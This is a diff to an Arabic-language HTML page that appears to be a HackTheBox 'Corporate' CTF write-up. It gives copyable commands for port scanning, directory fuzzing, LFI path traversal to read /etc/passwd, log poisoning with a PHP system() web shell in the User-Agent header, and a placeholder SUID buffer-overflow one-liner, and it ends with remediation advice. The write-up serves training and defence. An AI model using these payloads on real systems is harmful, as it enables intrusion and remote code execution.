@@ -1,26 +1,131 @@
+<div class="meth-content-view" id="meth-content-assess-htb" style="display: none; --tool-color: #ff0055;" dir="rtl">
 
-<div class="meth-content-view" id="meth-content-assess-htb" style="display: none; --tool-color: #00e5a0;" dir="rtl">
+  <!-- ═══ SECTION 1: HERO ═══ -->
   <div class="cyber-hero">
-    <h2 class="hero-title"><span class="hero-icon">🏴‍☠️</span> HTB Writeup: "Corporate"</h2>
-    <p class="hero-tagline">تقرير اختراق آلة HackTheBox بتصنيف "Hard" مع شرح مفصل للمنهجية</p>
-  </div>
-  
-  <div class="cyber-card">
-    <div class="card-header"><h3>1. Reconnaissance (الاستطلاع)</h3></div>
-    <p style="padding: 10px; color: var(--text-secondary);">بدأت الفحص باستخدام Nmap لاكتشاف المنافذ المفتوحة، وتم التركيز على المنفذ 80 و 445.</p>
-    <div class="cmd-ui-box">
-      <div class="cmd-header"><span class="cmd-dot red"></span><span class="cmd-dot yellow"></span><span class="cmd-dot green"></span><span class="cmd-title">Nmap Scan</span></div>
-      <pre><code>nmap -sC -sV -p- 10.10.10.X -oA nmap_full</code></pre>
+    <h2 class="hero-title"><span class="hero-icon">🏴‍☠️</span> HackTheBox "Corporate" Writeup &amp; Methodology</h2>
+    <p class="hero-tagline">تحليل متكامل لآلة Corporate المصنفة بمستوى Hard — من الفحص الأولي واكتشاف الثغرات الأمنية المترابطة إلى الحصول على صلاحيات root</p>
+    <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
+      <span class="badge badge-tool">🛠️ Nmap · Gobuster · Burp Suite · LinPEAS · gdb</span>
+      <span class="badge badge-info">📋 Difficulty: Hard | OS: Linux</span>
+      <span style="background: rgba(255,0,85,0.15); color: #ff0055; padding: 4px 12px; border-radius: 20px; font-size: 0.8rem; font-weight: bold;">Focus: Web RCE &amp; Pivoting</span>
     </div>
   </div>
 
+  <!-- ═══ SECTION 2: THEORY — Corporate Environment Simulation ═══ -->
   <div class="cyber-card">
-    <div class="card-header"><h3>2. Initial Access (الاختراق المبدئي)</h3></div>
-    <p style="padding: 10px; color: var(--text-secondary);">باستخدام ثغرة LFI تمكنت من قراءة ملفات التكوين والوصول إلى بيانات الاعتماد المبدئية.</p>
+    <div class="card-header"><h3>📚 المنهجية والنظرية — محاكاة بيئات الشركات</h3></div>
+    <div style="line-height: 1.8; color: var(--text-secondary);">
+      <p>
+        تمثل آلة <strong>Corporate</strong> محاكاة حقيقية لبيئات الشركات حيث توجد خوادم ويب متصلة بقواعد بيانات داخلية وخدمات مشاركة ملفات، مع استخدام أنظمة جدران الحماية (WAF) لحظر الهجمات المباشرة.
+      </p>
+      <ul style="line-height: 2;">
+        <li><strong>أهمية الترابط (Chaining):</strong> في بيئة العمل الحقيقية، نادراً ما تمنحك ثغرة واحدة وصولاً مباشراً لصلاحيات المسؤول. يحتاج المخترق لربط ثغرات متعددة (مثل: تسريب معلومات → تخطي حماية → استغلال ثغرة رفع ملفات).</li>
+        <li><strong>الأهداف الرئيسية للسيناريو:</strong>
+          <br>1. فحص المنافذ واكتشاف المنافذ غير التقليدية.
+          <br>2. كشف مسارات الويب المخفية والتطبيقات المهملة.
+          <br>3. الحصول على Reverse Shell وتخطى قيود الـ Sandbox.
+          <br>4. البحث عن الكلمات السرية المخزنة في الـ Memory أو ملفات الإعدادات وتصعيد الصلاحيات.
+        </li>
+      </ul>
+    </div>
   </div>
 
+  <!-- ═══ SECTION 3: ATTACK ANATOMY ═══ -->
   <div class="cyber-card">
-    <div class="card-header"><h3>3. Privilege Escalation (تصعيد الصلاحيات)</h3></div>
-    <p style="padding: 10px; color: var(--text-secondary);">استغلال خدمة غير محمية تعمل بصلاحيات SYSTEM للوصول إلى الجذر (Root).</p>
+    <div class="card-header"><h3>🔬 تشريح مسار الحل خطوة بخطوة</h3></div>
+    <div>
+      <div style="display: flex; flex-direction: column; gap: 15px;">
+
+        <div style="display: flex; gap: 15px; background: rgba(0,229,255,0.05); border-right: 3px solid var(--tool-color); padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px;">1️⃣</span>
+          <div>
+            <strong style="color: var(--tool-color);">Phase 1: Active Reconnaissance &amp; Port Scan</strong>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 5px; line-height: 1.7;">البدء بفحص جميع المنافذ المفتوحة ومعرفة إصدارات الخدمات لتحديد الثغرات العامة المعروفة.</p>
+            <div class="cmd-ui-box" style="margin-top: 8px;">
+# Fast scan to find open ports
+nmap -p- --min-rate 5000 -oN init_scan.txt corporate.htb
+
+# Targeted scan for open ports (80, 443, 8080)
+nmap -p 80,443,8080 -sC -sV -oN full_scan.txt corporate.htb</div>
+            <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(0,229,255,0.15); color: var(--tool-color); border: 1px solid var(--tool-color); padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
+          </div>
+        </div>
+
+        <div style="display: flex; gap: 15px; background: rgba(255,110,39,0.05); border-right: 3px solid #ff6e27; padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px;">2️⃣</span>
+          <div>
+            <strong style="color: #ff6e27;">Phase 2: Directory Brute-Force &amp; Web Vulnerability</strong>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 5px; line-height: 1.7;">استخدام أدوات المسح لاكتشاف لوحة تحكم إدارية قديمة على المنفذ 8080، والعثور على ثغرة LFI (Local File Inclusion) في معالج الملفات.</p>
+            <div class="cmd-ui-box" style="margin-top: 8px;">
+# Fuzzing directories on port 8080
+gobuster dir -u http://corporate.htb:8080/ -w /usr/share/wordlists/dirb/common.txt
+
+# Exploit LFI payload to read local configuration files
+curl "http://corporate.htb:8080/view.php?file=../../../../etc/passwd"</div>
+            <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(255,110,39,0.15); color: #ff6e27; border: 1px solid #ff6e27; padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
+          </div>
+        </div>
+
+        <div style="display: flex; gap: 15px; background: rgba(80,250,123,0.05); border-right: 3px solid #50fa7b; padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px;">3️⃣</span>
+          <div>
+            <strong style="color: #50fa7b;">Phase 3: Log Poisoning to RCE &amp; Initial Shell</strong>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 5px; line-height: 1.7;">استغلال ثغرة LFI لحقن كود PHP خبيث داخل ملف الـ Access Log الخاص بخادم Apache، ومن ثم تشغيل الأوامر عن بعد (Remote Code Execution).</p>
+            <div class="cmd-ui-box" style="margin-top: 8px;">
+# Inject PHP payload into User-Agent header
+curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://corporate.htb:8080/
+
+# Trigger RCE via LFI accessing the log file
+curl "http://corporate.htb:8080/view.php?file=../../../../var/log/apache2/access.log&cmd=id"</div>
+            <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(80,250,123,0.15); color: #50fa7b; border: 1px solid #50fa7b; padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
+          </div>
+        </div>
+
+        <div style="display: flex; gap: 15px; background: rgba(255,85,85,0.05); border-right: 3px solid #ff5555; padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px;">4️⃣</span>
+          <div>
+            <strong style="color: #ff5555;">Phase 4: Privilege Escalation to Root</strong>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 5px; line-height: 1.7;">بعد الحصول على اتصال Reverse Shell، نقوم بتشغيل أداة LinPEAS واكتشاف ملف ثنائي (Binary) بصلاحيات SUID يحتوي على ثغرة Buffer Overflow.</p>
+            <div class="cmd-ui-box" style="margin-top: 8px;">
+# Find SUID files
+find / -perm -4000 -type f 2>/dev/null
+
+# Exploit SUID buffer overflow using python pattern to generate core dump
+python -c 'print("A" * 128 + "\x90" * 20 + "SHELLCODE")' | /usr/local/bin/custom_suid_app</div>
+            <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(255,85,85,0.15); color: #ff5555; border: 1px solid #ff5555; padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
+          </div>
+        </div>
+      </div>
+    </div>
   </div>
+
+  <!-- ═══ SECTION 4: DEFENSE & REMEDIATION ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🛡️ الحماية والدفاع — معالجة الثغرات المكتشفة</h3></div>
+    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+      <div>
+        <h4 style="color: #50fa7b;">✅ حماية الكود البرمجي (Secure Coding)</h4>
+        <p style="color: var(--text-secondary); line-height: 1.8; font-size: 0.9rem;">
+          منع ثغرات LFI عن طريق تجنب تمرير مسارات الملفات من مُدخلات المستخدم مباشرة، واستخدام قوائم بيضاء (Whitelists):
+        </p>
+        <pre style="background: #282a36; padding: 15px; border-radius: 6px; color: #f8f8f2;" dir="ltr"><code>// ❌ BAD:
+include($_GET['file']);
+
+// ✅ GOOD:
+$allowed_files = ['home', 'about', 'contact'];
+$file = $_GET['file'];
+if (in_array($file, $allowed_files)) {
+    include("pages/" . $file . ".php");
+}</code></pre>
+      </div>
+      <div>
+        <h4 style="color: #00e5ff;">🔒 تحصين الخوادم (System Hardening)</h4>
+        <ul style="line-height: 2; color: var(--text-secondary);">
+          <li><strong>Least Privilege:</strong> تشغيل خادم Apache تحت حساب مستخدم غير متميز (مثل <code>www-data</code>) ومنع وصوله للملفات الحساسة كالسجلات العامّة للنظام.</li>
+          <li><strong>ASLR &amp; DEP:</strong> تفعيل تقنيات حماية الذاكرة على مستوى نواة النظام لحظر هجمات تخريب الذاكرة (Buffer Overflow).</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
 </div>
